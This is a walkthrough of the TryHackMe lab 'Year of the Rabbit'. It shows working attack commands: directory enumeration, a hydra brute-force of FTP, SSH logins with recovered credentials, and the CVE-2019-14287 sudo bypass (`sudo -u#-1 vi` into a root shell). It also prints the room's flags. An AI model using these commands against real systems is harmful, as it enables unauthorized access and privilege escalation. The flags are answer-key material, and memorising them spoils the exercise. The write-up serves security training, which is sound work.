# Year of the Rabbit - TryHackMe Walkthrough

## 1. Challenge Overview
**Name:** Year of the Rabbit  
**Category:** Boot2Root / Steganography / Privilege Escalation  
**Difficulty:** Easy/Medium  
**Points/Reward:** N/A (Standard TryHackMe Room)  
**Challenge Prompt:** 
> Let's have a nice gentle start to the New Year!
> Can you hack into the Year of the Rabbit box without falling down a hole?
> (Please ensure your volume is turned up!)

---

## 2. Setup & Enumeration

**Initial Assessment:** 
We were provided with a single target IP address (`10.48.166.218`). The first step was to identify open ports and available services to establish our attack surface.

**Reconnaissance Tools:**
```bash
nmap -sC -sV -oA nmap_init 10.48.166.218
```

**Findings:**
The `nmap` scan revealed three open ports:
*   **Port 21:** vsftpd 3.0.2 (FTP)
*   **Port 22:** OpenSSH 6.7p1 Debian 5 (SSH)
*   **Port 80:** Apache httpd 2.4.10 (HTTP)

Next, we performed web directory enumeration using `gobuster`:
```bash
gobuster dir -u http://10.48.166.218/ -w /usr/share/wordlists/dirb/common.txt
```
This revealed an `/assets` directory. Fetching the assets index showed `RickRolled.mp4` and `style.css`. Inspecting the CSS file revealed a hidden developer comment:

```bash
curl -s http://10.48.166.218/assets/style.css
```
**Output Snippet:**
```css
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```
Accessing `/sup3r_s3cr3t_fl4g.php` triggered an HTTP 302 redirect pointing to a hidden directory: `intermediary.php?hidden_directory=/WExYY2Cv-qU`. Inside this hidden directory was a single image: `Hot_Babe.png`.

---

## 3. Rabbit Holes & Failed Attempts
*   **Anonymous FTP:** Before finding the hidden web directories, I attempted to log into the FTP server using the `anonymous` user. This was disabled (`530 Permission denied`), saving me from wasting time there without credentials.
*   **The RickRoll:** The challenge prompt hinted at keeping the volume up. The `/assets/RickRolled.mp4` file is a classic CTF distraction. Downloading and analyzing the video would have been a massive time sink (rabbit hole). The real clue was adjacent to it in the CSS file.

---

## 4. Exploitation & Solution

**The Vulnerability:** 
The initial foothold relies on poor operational security (OpSec): developers leaving sensitive information in CSS comments, appending plain-text passwords to the end of image files, and storing encoded credentials on a reachable FTP server.

**Step-by-Step Execution:**

1.  **Extracting the Password List:** We used the `strings` command on `Hot_Babe.png` to read the trailer data (data appended after the PNG `IEND` chunk).
    ```bash
    strings Hot_Babe.png | tail -n 85
    ```
    This revealed the FTP username (`ftpuser`) and a list of 82 possible passwords. We saved these into a file called `ftp_passwords.txt`.

2.  **Brute-Forcing FTP:** Using `hydra`, we brute-forced the FTP login.
    ```bash
    hydra -l ftpuser -P ftp_passwords.txt ftp://10.48.166.218
    ```
    *Result:* `[21][ftp] login: ftpuser   password: 5iez1wGXKfPKQ`

3.  **Retrieving and Decoding Credentials:** We logged into FTP using the discovered credentials and downloaded `Eli's_Creds.txt`. The file contained text that looked like a **Brainfuck** program.

    To decode this, I wrote a complete Python interpreter to handle the esoteric syntax.

    **The Decoder Script (`bf_decoder.py`):**
    ```python
    import sys

    def brainfuck_interpreter(code):
        # Sanitize code (only keep valid brainfuck characters)
        code = "".join([c for c in code if c in "><+-.,[]"])
        
        memory = [0] * 30000
        ptr = 0
        pc = 0
        
        # Precompute loop jumps for efficiency
        loops = []
        jumps = {}
        for i, char in enumerate(code):
            if char == "[":
                loops.append(i)
            elif char == "]":
                if loops:
                    start = loops.pop()
                    jumps[start] = i
                    jumps[i] = start
        
        # Execution loop
        output = []
        while pc < len(code):
            char = code[pc]
            if char == ">":
                ptr += 1
            elif char == "<":
                ptr -= 1
            elif char == "+":
                memory[ptr] = (memory[ptr] + 1) % 256
            elif char == "-":
                memory[ptr] = (memory[ptr] - 1) % 256
            elif char == ".":
                output.append(chr(memory[ptr]))
            elif char == "[":
                if memory[ptr] == 0:
                    pc = jumps[pc]
            elif char == "]":
                if memory[ptr] != 0:
                    pc = jumps[pc]
            pc += 1
        return "".join(output)

    if __name__ == "__main__":
        if len(sys.argv) > 1:
            with open(sys.argv[1], "r") as f:
                print(brainfuck_interpreter(f.read()))
        else:
            print("Usage: python3 bf_decoder.py Eli's_Creds.txt")
    ```

    **Decoded Output:**
    ```text
    User: eli
    Password: DSpDiM1wAEwid
    ```

---

## 5. Post-Exploitation / Privilege Escalation

**Lateral Movement (Eli -> Gwendoline):**
We used the decoded credentials to SSH into the machine as `eli`. Upon login, an automated message from root was displayed:
```text
Message from Root to Gwendoline:
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
```

We searched the system for the string "s3cr3t":
```bash
find / -name "*s3cr3t*" 2>/dev/null
```
This led us to `/usr/games/s3cr3t/`. Inside was a hidden file: `.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!`.
Reading this file provided Gwendoline's password:
```text
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
```

**Privilege Escalation (Gwendoline -> Root):**
After SSH'ing in as `gwendoline` and grabbing the user flag, we checked our sudo permissions:
```bash
sudo -l
```
*Output:*
```text
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
This configuration allows Gwendoline to run `vi` on the user flag file as *any user except root*. However, the installed sudo version (`1.8.10p3`) is vulnerable to **CVE-2019-14287**. By passing `-u#-1` (or `4294967295`), the system interprets the User ID as `0` (root), completely bypassing the `!root` restriction.

We launched `vi` with the exploit payload:
```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
Once the `vi` editor opened with root privileges, we used the `!` command to drop into a shell context and read the root flag:
`:!cat /root/root.txt`

---

## 6. The Flag

**User Flag:** 
`THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`

**Root Flag:** 
`THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}`

---

## 7. Takeaways & Conclusion

*   **Leave No Trace in Production:** Source code comments (`style.css`) and development files (`Hot_Babe.png` trailing data) often expose sensitive infrastructure details. Always sanitize assets before deployment.
*   **Encoding is Not Encryption:** Brainfuck is an esoteric programming language, not a cryptographic standard. Hiding credentials by merely encoding them provides zero security.
*   **Sudo Misconfigurations (CVE-2019-14287):** Attempting to restrict a user via `!root` in the `sudoers` file is dangerous if the system is unpatched. Always keep critical binaries like `sudo` up to date to prevent integer overflow bypasses.
*   **Dangerous Binaries:** Granting `sudo` access to text editors like `vi`, `vim`, or `nano` is essentially granting full root shell access, as these programs have built-in functions to execute shell commands (`:!sh`).
